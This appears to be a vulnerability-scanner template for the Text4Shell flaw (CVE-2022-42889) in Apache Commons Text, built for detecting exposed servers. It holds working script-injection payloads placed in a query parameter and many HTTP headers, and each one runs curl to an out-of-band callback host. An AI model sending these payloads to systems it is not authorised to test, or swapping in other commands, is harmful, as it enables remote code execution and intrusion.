id: CVE-2022-42889

info:
  name: Text4Shell Remote Code Execution
  author: mordavid
  severity: critical
  description: |
    Apache Commons Text 1.5-1.9, CVE-2022-42889 affects Apache Commons Text versions 1.5 through 1.9. It has been patched as of Commons Text version 1.10.
  reference:
    - https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om
    - http://www.openwall.com/lists/oss-security/2022/10/13/4
    - http://www.openwall.com/lists/oss-security/2022/10/18/1
    - https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
    - https://github.com/silentsignal/burp-text4shell
  remediation: Upgrade to Apache Commons Text component between 1.5.0 to 1.10.0.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-42889
  tags: cve,cve2022,rce,oast,text4shell

requests:
  - raw:
      - |
        GET /?search=%24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.uri.{{interactsh-url}}')%7d  HTTP/1.1
        Host: {{Hostname}}

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Accept: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accept.{{interactsh-url}}')%7d
        Accept-Encoding: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.acceptencoding.{{interactsh-url}}')%7d
        Accept-Language: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.acceptlanguage.{{interactsh-url}}')%7d
        Access-Control-Request-Headers: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accesscontrolrequestheaders.{{interactsh-url}}')%7d
        Access-Control-Request-Method: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.accesscontrolrequestmethod.{{interactsh-url}}')%7d
        Authentication: Basic %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.authenticationbasic.{{interactsh-url}}')%7d
        Authentication: Bearer %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.authenticationbearer.{{interactsh-url}}')%7d
        Cookie: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.cookiename.{{interactsh-url}}')%7d=%24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.cookievalue.{{interactsh-url}}')%7d
        Location: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.location.{{interactsh-url}}')%7d
        Origin: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.origin.{{interactsh-url}}')%7d
        Referer: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.referer.{{interactsh-url}}')%7d
        Upgrade-Insecure-Requests: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.upgradeinsecurerequests.{{interactsh-url}}')%7d
        User-Agent: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.useragent.{{interactsh-url}}')%7d
        X-Api-Version: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.xapiversion.{{interactsh-url}}')%7d
        X-CSRF-Token: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.xcsrftoken.{{interactsh-url}}')%7d
        X-Druid-Comment: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.xdruidcomment.{{interactsh-url}}')%7d
        X-Forwarded-For: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.xforwardedfor.{{interactsh-url}}')%7d
        X-Origin: %24%7bscript:javascript:java.lang.Runtime.getRuntime().exec('curl%20{{Hostname}}.xorigin.{{interactsh-url}}')%7d

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output

    extractors:
      - type: kval
        kval:
          - interactsh_ip # Print remote interaction IP in output

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
